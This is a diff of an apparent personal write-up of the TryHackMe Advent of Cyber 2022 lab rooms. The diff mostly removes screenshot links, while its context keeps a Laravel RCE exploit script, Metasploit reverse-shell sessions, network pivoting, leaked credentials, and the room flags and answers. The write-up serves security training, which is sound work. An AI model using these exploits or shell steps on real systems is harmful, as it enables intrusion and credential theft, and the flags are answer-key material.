@@ -115,19 +115,6 @@ Answer the questions below
 
 Who is the adversary that attacked Santa's network this year?
 
-![[Pasted image 20221217230257.png]]
-
-![[Pasted image 20221217230432.png]]
-![[Pasted image 20221217230444.png]]
-
-![[Pasted image 20221217230456.png]]
-![[Pasted image 20221217230609.png]]
-![[Pasted image 20221217230619.png]]
-![[Pasted image 20221217230630.png]]
-![[Pasted image 20221217230752.png]]
-![[Pasted image 20221217230803.png]]
-![[Pasted image 20221217230813.png]]
-
 *The Bandit Yeti!*
 
 What's the flag that they left behind?  
@@ -479,15 +466,12 @@ Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
   Memory usage: 21%               IPv4 address for ens5: 10.10.147.68
   Swap usage:   0%
 
-
 1 update can be installed immediately.
 0 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
-
 
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
@@ -531,7 +515,6 @@ zilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) C
 10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET / HTTP/1.1" 200 2980 "-" "gobuster/3.0.1"
 10.10.249.191 - - [18/Nov/2022:12:28:15 +0000] "GET /d30f0e6a-9e9c-465a-b4d2-279e8785efde HTT
 P/1.1" 404 437 "-" "gobuster/3.0.1"
-
 
 ```
 
@@ -672,15 +655,11 @@ Check the who.is/whois website to find WHOIS information.
 
 https://whois.domaintools.com/santagift.shop
 
-![[Pasted image 20221217232129.png]]
-
 *Namecheap, Inc.*
 
 Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?  
 
 Use the same search terms that Recon McRed used on github.com to find the leaked source code.
-
-![[Pasted image 20221217232219.png]]
 
 site:github.com SantaGiftShop
 
@@ -689,7 +668,6 @@ https://github.com/muhammadthm/SantaGiftShop/blob/main/config.php
 *{THM_OSINT_WORKS}*
 
 What is the name of the file containing passwords?  
-
 
 *config.php*
 
@@ -704,7 +682,6 @@ What is the DB_PASSWORD that is being reused between the QA and PROD environment
 *S@nta2022*
 
 Check out this [room](https://tryhackme.com/room/googledorking) if you'd like to learn more about Google Dorking!
-
 
 ### [Day 4] Scanning Scanning through the snow
 
@@ -881,15 +858,9 @@ What flag can you find after successfully accessing the Samba service?
 
 It is located in the admins folder.
 
-![[Pasted image 20221217232819.png]]
-![[Pasted image 20221217232850.png]]
-![[Pasted image 20221217232906.png]]
-![[Pasted image 20221217232932.png]]
 *{THM_SANTA_SMB_SERVER}*
 
 What is the password for the username santahr?  
-
-![[Pasted image 20221217233010.png]]
 
 *santa25*
 
@@ -1072,18 +1043,11 @@ Using a VNC client on the AttackBox, connect to the target of IP address `MACHI
 
 You can use Remmina to connect to your target using VNC with the password that you have found.
 
-![[Pasted image 20221217233717.png]]
-![[Pasted image 20221217233740.png]]
-![[Pasted image 20221217233807.png]]
-
-![[Pasted image 20221217233835.png]]
-
 *THM{I_SEE_YOUR_SCREEN}*
 
 If you liked the topics presented in this task, check out these rooms next: [Protocols and Servers 2](https://tryhackme.com/room/protocolsandservers2), [Hydra](https://tryhackme.com/room/hydra), [Password Attacks](https://tryhackme.com/room/passwordattacks), [John the Ripper](https://tryhackme.com/room/johntheripper0).   
 
  Completed
-
 
 ### [Day 6] Email Analysis It's beginning to look a lot like phishing
 
@@ -1509,7 +1473,6 @@ workload is shared with the rest to avoid any toy production delay.</span></div>
 [+] Attachment [1] "Division_of_labour-Load_share_plan.doc" extracted to eml_attachments/Division_of_labour-Load_share_plan.doc
 ```
 
-
 *chief.elf@santaclaus.thm*
 
 What is the return address?  
@@ -1541,8 +1504,6 @@ What is the reputation result of the sender's email address?
 
 https://emailrep.io/
 
-![[Pasted image 20221217235705.png]]
-
 **
 
 Check the attachments.  
@@ -1570,16 +1531,12 @@ What is the second tactic marked in the Mitre ATT&CK section?
 
 https://www.virustotal.com/gui/file/0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467/behavior
 
-![[Pasted image 20221217235948.png]]
-
 *Defense Evasion*
 
 Visit the InQuest website and use the hash value to search.  
 What is the subcategory of the file?  
 
 https://labs.inquest.net/dfi/sha256/0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467
-
-![[Pasted image 20221217235840.png]]
 
 *macro_hunter*
 
@@ -1714,22 +1671,9 @@ Answer the questions below
 
 What is the version of CyberChef found in the attached VM?
 
-![[Pasted image 20221218000746.png]]
-
 *9.49.0*
 
 How many recipes were used to extract URLs from the malicious doc?  
-
-![[Pasted image 20221218001004.png]]
-![[Pasted image 20221218001057.png]]
-![[Pasted image 20221218001133.png]]
-![[Pasted image 20221218001209.png]]
-![[Pasted image 20221218001246.png]]
-![[Pasted image 20221218001430.png]]
-![[Pasted image 20221218002143.png]]
-![[Pasted image 20221218002208.png]]
-![[Pasted image 20221218002233.png]]
-![[Pasted image 20221218002254.png]]
 
 *10*
 
@@ -1748,7 +1692,6 @@ What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
 *THM_MYSTERY_FLAG*
 
 If you liked the investigation today, you might also enjoy the [Security Information and Event Management](https://tryhackme.com/module/security-information-event-management) module!
-
 
 ###  [Day 8] Smart Contracts Last Christmas I gave you my ETH
 
@@ -1898,25 +1841,6 @@ If not already completed, download the zip folder attached to this task, and ope
  Completed
 
 What flag is found after attacking the provided EtherStore Contract?  
-
-![[Pasted image 20221218162542.png]]
-
-![[Pasted image 20221218162609.png]]
-
-![[Pasted image 20221218162649.png]]
-![[Pasted image 20221218162735.png]]
-![[Pasted image 20221218162751.png]]
-![[Pasted image 20221218162908.png]]
-![[Pasted image 20221218162922.png]]
-![[Pasted image 20221218162949.png]]
-![[Pasted image 20221218163015.png]]
-
-![[Pasted image 20221218163203.png]]
-![[Pasted image 20221218163222.png]]
-
-![[Pasted image 20221218163059.png]]
-![[Pasted image 20221218163252.png]]
-![[Pasted image 20221218170706.png]]
 
 trying with 5 or less eth deposit in order no to crash...
 
@@ -2105,7 +2029,6 @@ Metasploit Framework console...
   | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
   |  = = = = = = = = = = = =  |     '--------------'      |
   +---------------------------+---------------------------+
-
 
        =[ metasploit v6.2.27-dev-4c958546b5               ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
@@ -2408,7 +2331,6 @@ IPv4 Active Routing Table
    172.17.0.1         255.255.255.255    Session 3
    172.28.101.51      255.255.255.255    Session 3
 
-
 [*] There are currently no IPv6 routes defined.
 ```
 
@@ -2521,9 +2443,6 @@ Nmap done: 1 IP address (1 host up) scanned in 32.73 seconds
 *80*
 
 What framework is the web application developed with?  
-![[Pasted image 20221218222413.png]]
-
-![[Pasted image 20221218223947.png]]
 
 *laravel*
 
@@ -2551,7 +2470,6 @@ UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary Fil | php/webapps/46389.p
 ----------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit -m php/webapps/49424.py
   Exploit: Laravel 8.4.2 debug mode - Remote code execution
@@ -2561,7 +2479,6 @@ Shellcodes: No Results
  Verified: False
 File Type: Python script, ASCII text executable
 Copied to: /home/kali/49424.py
-
 
                                                                                              
 ┌──(kali㉿kali)-[~]
@@ -2576,7 +2493,6 @@ Copied to: /home/kali/49424.py
 # Version: <= 8.4.2
 # Tested on: Ubuntu 18.04 + nginx + php 7.4.3
 # Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce
-
 
 #!/usr/bin/env python3
 
@@ -2648,7 +2564,6 @@ def generate_payload(command='', padding=0):
     os.system('rm -rf payload.txt')
     return payload
 
-
 def main():
 
     if len(sys.argv) < 4:
@@ -2712,7 +2627,6 @@ Matching Modules
    0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
    1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
 
-
 Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce                                                                    
 
 msf6 > use 1
@@ -2736,7 +2650,6 @@ Module options (exploit/multi/php/ignition_laravel_debug_rce):
               ion
    VHOST                                no        HTTP server virtual host
 
-
 Payload options (cmd/unix/reverse_bash):
 
    Name   Current Setting  Required  Description
@@ -2744,14 +2657,11 @@ Payload options (cmd/unix/reverse_bash):
    LHOST                   yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Unix (In-Memory)
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -2802,8 +2712,6 @@ Active sessions
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > [*] Meterpreter session 2 opened (10.8.19.103:4433 -> 10.10.117.214:33308) at 2022-12-18 22:41:36 -0500
 
 [*] Stopping exploit/multi/handler
-
-
 
 ```
 
@@ -2924,12 +2832,10 @@ Host resolutions
 meterpreter > background
 [*] Backgrounding session 3...
 
-
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
 [*] Route added
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
 [*] Route added
-
 
 ```
 
@@ -2938,7 +2844,6 @@ What IP is 172.17 0.1 docker?
 Listen to Connections in the Docker Network  
   
 The bridge connection docker0 – with IP address 172.17. 0.1 – is **created by Docker at installation time**. Because the host and all containers are connected to that network, our application only needs to listen to it.
-
 
 ```
 meterpreter > cd /
@@ -2986,13 +2891,11 @@ IPv4 Active Routing Table
 
 [*] There are currently no IPv6 routes defined.
 
-
 ```
 
 */.dockerenv*
 
 What file often contains useful credentials for web applications?  
-
 
 *.env*
 
@@ -3060,7 +2963,6 @@ Query Text: 'select * from users'
     1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
 
 [*] Auxiliary module execution completed
-
 
 ```
 
@@ -3212,7 +3114,6 @@ proxychains: can't load process '-h'. (hint: it's probably a typo): No such file
 # proxychains.conf  VER 4.x
 #
 #        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.
-
 
 # The option below identifies how the ProxyList is treated.
 # only one option should be uncommented at time,
@@ -3422,7 +3323,6 @@ THM{47C61A0FA8738BA77308A8A600F88E4B}
 
 ```
 
-
 *22,80*
 
 What is the root flag?  
@@ -3608,7 +3508,6 @@ Read what Elf McSkidy says after dying. There's a big hint there!
 **
 
 If you liked today's challenge, the [Walking an Application](https://tryhackme.com/room/walkinganapplication) room is an excellent follow-up!
-
 
 ### [Day 11] Memory Forensics Not all gifts are nice
 
@@ -3969,7 +3868,6 @@ PE TimeDateStampMon Apr 14 21:36:50 2104
 
 *10*
 
-
 What is the name of the binary/gift that secret Santa left?  
 
 You may wish to use windows.pslist for this.
@@ -4114,7 +4012,6 @@ ImageSectionObject0xc0090ba9cce0sechost.dllfile.0xc0090ba9cce0.0xc0090e4d4bb0.Im
 *16*
 
 If you want to learn more about Volatility, please check out a dedicated room [here](https://tryhackme.com/room/volatility). For more content on forensics, we have a full [Digital Forensics and Incident Response](https://tryhackme.com/module/digital-forensics-and-incident-response) module for you!
-
 
 ### [Day 12] Malware Analysis Forensic McBlue to the REVscue!
 
@@ -4371,10 +4268,7 @@ What is the architecture of the malware sample? (32-bit/64-bit)
 ```
 using detect it easy (DIE)
 
-
 ```
-
-![[Pasted image 20221219185523.png]]
 
 *64-bit*
 
@@ -4402,8 +4296,6 @@ What is the registry key abused by the malware?
 
 Check the Path column.
 
-![[Pasted image 20221219210030.png]]
-
 ```
 C:\Users\Administrator\Desktop\Malware Sample>mv mysterygift mysterygift.exe                                                                                                                                                                                                                                                                    FLARE Mon 12/19/2022 18:01:04.61                                                                                                                                        C:\Users\Administrator\Desktop\Malware Sample>ls                                                                                                                        mysterygift.exe  mysterygift.viv                                                                                                                                                                                                                                                                                                                FLARE Mon 12/19/2022 18:01:07.25   
 
@@ -4424,18 +4316,7 @@ and for file
 -   CloseFile
 -   ReadFile
 
-
-
-
 ```
-
-![[Pasted image 20221219210207.png]]
-
-
-![[Pasted image 20221219211501.png]]
-
-![[Pasted image 20221219211634.png]]
-
 
 	*HKCU\Software\Microsoft\Windows\CurrentVersion\Run\*
 
@@ -4443,25 +4324,13 @@ What is the value written on the registry key based on the previous question?
 
 Check the Details column.
 
-![[Pasted image 20221219211750.png]]
-
 	*C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat*
 
-![[Pasted image 20221219212400.png]]
-
-![[Pasted image 20221219212429.png]]
-
-![[Pasted image 20221219212820.png]]
-
 	What are the names of two files created by the malware under the C:\Users\Administrator\ directory? (format: file1,file2 in alphabetical order)  
-
-![[Pasted image 20221219214456.png]]
 
 *test.jpg,wishes.bat*
 
 What are the two domains wherein malware has initiated a network connection? (format: domain1,domain2 in alphabetical order)  
-
-![[Pasted image 20221219214552.png]]
 
 *bestfestivalcompany.thm,virustotal.com*
 
@@ -4475,14 +4344,9 @@ C:\Users\Administrator\Desktop\Malware Sample>strings mysterygift.exe | grep htt
 or using DIE and strings and filer http:// and search :)
 ```
 
-
-![[Pasted image 20221219215015.png]]
-
-
 	*http://bestfestivalcompany.thm/favicon.ico*
 
 If you enjoyed malware analysis, try the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis) or [Dissecting PE Headers](https://tryhackme.com/room/dissectingpeheaders) rooms next!
-
 
 ### [Day 13] Packet Analysis Simply having a wonderful pcap time
 
@@ -4722,16 +4586,12 @@ View the "Protocol Hierarchy" menu.
 
 What is the "Percent Packets" value of the "Hypertext Transfer Protocol"?
 
-![[Pasted image 20221220120743.png]]
-
 *0.3*
 
 View the "Conversations".  
 Navigate to the TCP section.
 
 Which port number has received more than 1000 packets?
-
-![[Pasted image 20221220121022.png]]
 
 *3389*
 
@@ -4748,17 +4608,12 @@ Enter the domains in alphabetical order and defanged format. (format: domai
 
 Cyberchef can defang.
 
-![[Pasted image 20221220121458.png]]
-
-
 	*cdn[.]bandityeti[.]thm,bestfestivalcompany[.]thm*
 
 Filter the HTTP packets.
 
 What are the names of the requested files?  
 Enter the names in alphabetical order and in defanged format. (format: file[.]xyz,file[.]xyz)
-
-![[Pasted image 20221220121607.png]]
 
 	*favicon[.]ico,mysterygift[.]exe*
 
@@ -4767,8 +4622,6 @@ Enter your answer in defanged format.
 
 Cyberchef can defang.
 
-![[Pasted image 20221220121742.png]]
-
 	*10[.]10[.]29[.]186*
 
 Which domain address hosts the malicious file?  
@@ -4776,13 +4629,9 @@ Enter your answer in defanged format.
 
 View the "GET" request that downloads the malicious file. The "Host" section shows the domain address that hosts the file.
 
-![[Pasted image 20221220121926.png]]
-
 	*cdn[.]bandityeti[.]thm*
 
 What is the "user-agent" value used to download the non-executable file?  
-
-![[Pasted image 20221220122026.png]]
 
 *Nim httpclient/1.6.8*
 
@@ -4792,10 +4641,6 @@ Calculate the file hashes.
 What is the sha256 hash value of the executable file?
 
 "sha256sum" can help.
-
-![[Pasted image 20221220122139.png]]
-![[Pasted image 20221220122203.png]]
-![[Pasted image 20221220122237.png]]
 
 ```
 ubuntu@ip-10-10-8-159:~$ ls
@@ -4828,8 +4673,6 @@ We're only interested in TCP connections here.
 
 https://www.virustotal.com/gui/file/0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f/behavior
 
-![[Pasted image 20221220122733.png]]
-
 ```
 -   20.99.133.109:443 (TCP)
 -   20.99.184.37:443 (TCP)
@@ -4839,12 +4682,9 @@ https://www.virustotal.com/gui/file/0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493
 using cyberchef
 ```
 
-![[Pasted image 20221220122904.png]]
-
 	*20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]147[.]76*
 
 If you liked working with Wireshark, we have a comprehensive module on this helpful tool [here](https://tryhackme.com/module/wireshark). If you want to dive deeper, the [Network Security and Traffic Analysis](https://tryhackme.com/module/network-security-and-traffic-analysis) module is waiting for you!
-
 
 ### [Day 14] Web Applications I'm dreaming of secure web apps
 
@@ -4933,23 +4773,11 @@ What is the office number of Elf Pivot McRed?
 
 After logging in, try to change the number 101 in the URL to access the profile pages of other users.
 
-![[Pasted image 20221220134658.png]]
-![[Pasted image 20221220134719.png]]
-![[Pasted image 20221220134738.png]]
-![[Pasted image 20221220134808.png]]
-![[Pasted image 20221220134851.png]]
-![[Pasted image 20221220134916.png]]
-![[Pasted image 20221220134930.png]]
-![[Pasted image 20221220134945.png]]
-
 *134*
 
 Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?  
 
 After logging in, click on the profile image, copy the image address, and try incrementing or decrementing the number 101.
-
-![[Pasted image 20221220135134.png]]
-![[Pasted image 20221220135230.png]]
 
 *THM{CLOSE_THE_DOOR}*
 
@@ -4976,7 +4804,6 @@ Learning Objectives
 When emails are sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information.
 
 -   How to properly secure file upload functionality
-
 
 The _Unrestricted_ in Unrestricted File Uploads
 
@@ -5219,8 +5046,6 @@ Answer the questions below
 
 What is the name given to file uploads that allow threat actors to upload any files that they want?
 
-![[Pasted image 20221220170440.png]]
-
 *Unrestricted*
 
 What is the title of the web application developed by Santa's freelancer?  
@@ -5265,10 +5090,6 @@ meterpreter > cat c:\Users\HR_Elf\Documents\flag.txt
 meterpreter > cat 'c:\Users\HR_Elf\Documents\flag.txt'
 THM{Naughty.File.Uploads.Can.Get.You.RCE}
 ```
-
-![[Pasted image 20221220172113.png]]
-
-![[Pasted image 20221220172220.png]]
 
 *THM{Naughty.File.Uploads.Can.Get.You.RCE}*
 
@@ -5564,77 +5385,21 @@ Answer the questions below
 
 What is the value of Flag1?
 
-![[Pasted image 20221220214544.png]]
-
-![[Pasted image 20221220204106.png]]
-
-![[Pasted image 20221220204023.png]]
-
-![[Pasted image 20221220204129.png]]
-![[Pasted image 20221220204143.png]]
-![[Pasted image 20221220204208.png]]
-![[Pasted image 20221220204230.png]]
-![[Pasted image 20221220204247.png]]
-![[Pasted image 20221220204258.png]]
-![[Pasted image 20221220204327.png]]
-![[Pasted image 20221220204434.png]]
-![[Pasted image 20221220204511.png]]
-![[Pasted image 20221220204615.png]]
-![[Pasted image 20221220204827.png]]
-![[Pasted image 20221220205049.png]]
-![[Pasted image 20221220205108.png]]
-![[Pasted image 20221220205124.png]]
-![[Pasted image 20221220205207.png]]
-![[Pasted image 20221220205427.png]]
-
-![[Pasted image 20221220210059.png]]
-
-![[Pasted image 20221220221030.png]]
-![[Pasted image 20221220221056.png]]
-![[Pasted image 20221220221239.png]]
-![[Pasted image 20221220221338.png]]
-
-
 *THM{McCode, Elf McCode}*
 
 What is the value of Flag2?  
-
-![[Pasted image 20221220221409.png]]
-
-![[Pasted image 20221220221556.png]]
-
-![[Pasted image 20221220221617.png]]
-
-![[Pasted image 20221220221806.png]]
-
 
 *THM{KodeNRoll}*
 
 What is the value of Flag3?  
 
-![[Pasted image 20221220222338.png]]
-
-![[Pasted image 20221220222426.png]]
-![[Pasted image 20221220222437.png]]
-
 *THM{Are we secure yet?}*
 
 What is the value of Flag4?  
 
-![[Pasted image 20221220222555.png]]
-
-![[Pasted image 20221220222829.png]]
-![[Pasted image 20221220222839.png]]
-![[Pasted image 20221220223045.png]]
-![[Pasted image 20221220224503.png]]
-![[Pasted image 20221220224514.png]]
-![[Pasted image 20221220224556.png]]
-
-
 *THM{SQLi_who???}*
 
 If you'd like more SQLi in your life, check out this [room](https://tryhackme.com/room/sqlinjectionlm)!
-
 
 ### [Day 17] Secure Coding Filtering for Order Amidst Chaos
 
@@ -5841,9 +5606,7 @@ We are aware that some structured data are more complex than others, so we have 
 
 -   Filtering for Usernames: Alphanumeric, minimum of 6 characters, maximum of 12 characters, may consist of upper and lower case letters.
 
-
 		 Filtering for Emails: Follows the form "local-part@domain" (without quotation marks); local-part is a random string, and the domain is in the form of "<domain name>.tld". All top-level domains (tld) are ".com"
-
 
 -   Filtering for URLs: Starts with either http or https; some of the URLs have "www", and a TLD should exist.  
     
@@ -6014,7 +5777,6 @@ s0k4oraf9jtg165ld97
 juz19rrhr.27od9ra5chtgt354
 batteryvoltas@alfa.com
 
-
 ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^[a-zA-Z0-9]{6,12}$' strings 
 9z8yMc9T
 31337aq
@@ -6115,7 +5877,6 @@ https://horse.sample.com/shape/company?mom=collar#donkey
 ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep 'https.+\.' strings | wc -l
 7
 
-
 ```
 
 *16*
@@ -6125,7 +5886,6 @@ Filtering for URLs: How many of these URLs start with "https"?
 *7*
 
 If you feel like you could use more fundamental skills in your life, try the [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) module. All rooms are free in that one!
-
 
 ### [Day 18] Sigma Lumberjack Lenny Learns New Rules
 
@@ -6360,14 +6120,9 @@ tags: # Associated TTPs from MITRE ATT&CK
   - {attack.tactic} # MITRE Tactic
   - {attack.technique} # MITRE Technique 
 
-
 Successfully detected Suspicious Local Account Creation. Here is your flag - THM{n0t_just_your_u$ser}
 
 ```
-
-![[Pasted image 20221221165340.png]]
-
-![[Pasted image 20221221165400.png]]
 
 *THM{n0t_just_your_u$ser}*
 
@@ -6415,14 +6170,9 @@ tags: # Associated TTPs from MITRE ATT&CK
 Successfully detected Windows Software Discovery. Here is your flag - THM{wh@t_1s_Runn1ng_H3r3}
 ```
 
-
 *THM{wh@t_1s_Runn1ng_H3r3}*
 
 What was the User's path in the Challenge #2 log file?  
-
-![[Pasted image 20221221170710.png]]
-
-![[Pasted image 20221221170804.png]]
 
 	*SIGMA_AOC2022\Bandit Yeti*
 
@@ -6465,10 +6215,6 @@ Successfully detected Scheduled Task Creation. Here is your flag - THM{sch3dule_
 *THM{sch3dule_0npo1nt_101}*
 
 What was the MD5 hash associated with Challenge #3 logs?  
-
-![[Pasted image 20221221172113.png]]
-
-![[Pasted image 20221221172150.png]]
 
 *2F6CE97FAF2D5EEA919E4393BDD416A7*
 
@@ -6649,10 +6395,6 @@ What is the new baud rate that is negotiated between the microprocessor and ESP3
 
 What is the flag that is transmitted once the new baud rate was accepted?  
 
-![[Pasted image 20221221185908.png]]
-![[Pasted image 20221221190245.png]]
-![[Pasted image 20221221190401.png]]
-
 *THM{Hacking.Hardware.Is.Fun}*
 
 Looking for a challenge? Try our [Recent Threats](https://tryhackme.com/module/recent-threats) module!
@@ -6813,7 +6555,6 @@ fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
 fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
 fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----
 
-
 ```
 
 Bingo! We have the **public and private keys**, but what about the **paraphrase** usually used with the private key to decrypt a gpg encrypted file?  
@@ -6825,7 +6566,6 @@ Terminal
 ```shell-session
 ubuntu@machine:~bin-unsigned$ grep -ir paraphrase
 fmk/rootfs/gpg/secret.txt:PARAPHRASE: [OUTPUT INTENTIONALLY HIDDEN]
-
 
 ```
 
@@ -6845,7 +6585,6 @@ gpg:              unchanged: 1
 gpg:       secret keys read: 1
 gpg:  secret keys unchanged: 1
 
-
 ```
 
 While importing the private key, you will be asked to enter the paraphrase. Enter the one you found in **Step 3**.
@@ -6859,7 +6598,6 @@ ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key
 gpg: key 56013838A8C14EC1: "McSkidy " not changed
 gpg: Total number processed: 1
 gpg:              unchanged: 1
-
 
 ```
 
@@ -6875,8 +6613,6 @@ sec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]
       514B4994E9B3E47A4F89507A56013838A8C14EC1
 uid           [ unknown] McSkidy 
 ssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]
-
-
 
 ```
 
@@ -6965,7 +6701,6 @@ Look into the fmk/rootfs folder.
   Memory usage: 9%                IP address for eth0: 10.10.149.38
   Swap usage:   0%
 
-
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
@@ -6974,7 +6709,6 @@ Look into the fmk/rootfs folder.
 1 update is a security update.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Thu Dec 22 04:21:50 2022 from 10.100.2.209
 test@ip-10-10-149-38:~$ ls
@@ -7028,7 +6762,6 @@ Extracting squashfs files...
 [sudo] password for test: 
 Firmware extraction successful!
 Firmware parts can be found in '/home/test/bin-unsigned/fmk/*'
-
 
 test@ip-10-10-149-38:~/bin-unsigned$ ls
 firmwarev1.0-unsigned  fmk
@@ -7519,7 +7252,6 @@ sec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]
 uid           [ unknown] McSkidy <mcskidy@santagift.shop>
 ssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]
 
-
 test@ip-10-10-149-38:~/bin$ gpg firmwarev2.2-encrypted.gpg 
 
 ┌────────────────────────────────────────────────────────────────┐
@@ -7533,7 +7265,6 @@ test@ip-10-10-149-38:~/bin$ gpg firmwarev2.2-encrypted.gpg
 ││
 │<OK><Cancel>│
 └────────────────────────────────────────────────────────────────┘
-
 
 gpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 2022-11-17
       "McSkidy <mcskidy@santagift.shop>"
@@ -7596,10 +7327,7 @@ Camera  bin  dev  etc  flag.txt  lib  linuxrc  mnt  proc  root  sbin  sys  tmp  
 test@ip-10-10-149-38:~/bin/fmk/rootfs$ cat flag.txt
 THM{WE_GOT_THE_FIRMWARE_CODE}
 
-
 ```
-
-![[Pasted image 20221221233753.png]]
 
 *THM{WE_GOT_THE_FIRMWARE_CODE}*
 
@@ -7893,7 +7621,6 @@ drwxr-xr-x  2 root root 4.0K Apr  6  2016 userRpm
 
 Did you know we have a wonderful community [on Discord](https://discord.gg/tryhackme)? If you join us there, you can count on nice conversation, cyber security tips & tricks, and room help from our mods and mentors. Our Discord admin has some rooms out, too - you can try an [easy one](https://tryhackme.com/room/githappens) or a [hard one](https://tryhackme.com/room/shaker)!
 
-
 ### [Day 21] MQTT Have yourself a merry little webcam
 
 ﻿                        The Story
@@ -7955,7 +7682,6 @@ Bluetooth utiliza una frecuencia de radio de 2,4 GHz y puede transmitir datos a 
 
 En resumen, Bluetooth es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos electrónicos a corta distancia de manera sencilla y eficiente. Se utiliza principalmente para conectar dispositivos móviles con otros dispositivos, como auriculares y altavoces, y es compatible con una amplia variedad de dispositivos y sistemas operativos.
 
-
 Wi-Fi es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos a Internet y a redes locales. Es una opción muy popular para la conexión a Internet en hogares y lugares de trabajo y se utiliza en una amplia variedad de dispositivos, incluyendo computadoras, teléfonos móviles, tabletas y televisores inteligentes.
 
 Wi-Fi utiliza una frecuencia de radio de 2,4 GHz o 5 GHz y puede transmitir datos a una velocidad muy alta, lo que lo hace ideal para la conexión a Internet y el intercambio de datos entre dispositivos. Para conectarse a una red Wi-Fi, los dispositivos necesitan estar cerca de un router o punto de acceso que proporcione la conexión a Internet. Una vez que los dispositivos están conectados a la red, pueden comunicarse entre sí y acceder a Internet de manera rápida y sencilla.
@@ -7967,7 +7693,6 @@ Middleware es un software que actúa como intermediario entre diferentes sistema
 Por ejemplo, si una empresa tiene diferentes sistemas que utilizan bases de datos diferentes, el middleware puede ser utilizado para permitir que estos sistemas compartan datos y se integren de manera más sencilla. El middleware puede proporcionar una interfaz común para que los diferentes sistemas accedan a los datos y puede realizar tareas como la traducción de los datos de un formato a otro para que puedan ser utilizados por los diferentes sistemas.
 
 En resumen, el middleware es un software que actúa como intermediario entre diferentes sistemas y aplicaciones, permitiendo que se comuniquen y compartan datos de manera más eficiente y haciendo que trabajen juntos de manera más fluida. Se utiliza para integrar diferentes sistemas y proporcionar una interfaz común para el acceso a los datos.
-
 
 Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.
 
@@ -8501,7 +8226,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 99.24 seconds
 
-
 ```
 
 *1883*
@@ -8746,8 +8470,6 @@ THM{UR_CAMERA_IS_MINE}
 
 ```
 
-![[Pasted image 20221222124459.png]]
-
 *THM{UR_CAMERA_IS_MINE}*
 
 If you want to learn more check out the [Command Injection](https://tryhackme.com/room/oscommandinjection) room or the [Vulnerability Research](https://tryhackme.com/module/vulnerability-research) module!
@@ -8831,13 +8553,6 @@ Answer the questions below
 
 Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task.
 
-![[Pasted image 20221222130819.png]]
-![[Pasted image 20221222130836.png]]
-![[Pasted image 20221222131019.png]]
-![[Pasted image 20221222131041.png]]
-![[Pasted image 20221222131117.png]]
-
-
 *THM{4TT4CK SURF4C3 R3DUC3D}*
 
 If you'd like to study cyber defence more, why not start with the [Threat and Vulnerability Management](https://tryhackme.com/module/threat-and-vulnerability-management) module?
@@ -8914,70 +8629,29 @@ Answer the questions below
 
 Case 1: What is the password for Santa’s Vault?
 
-![[Pasted image 20221223120952.png]]
-![[Pasted image 20221223121041.png]]
-![[Pasted image 20221223121119.png]]
-![[Pasted image 20221223121149.png]]
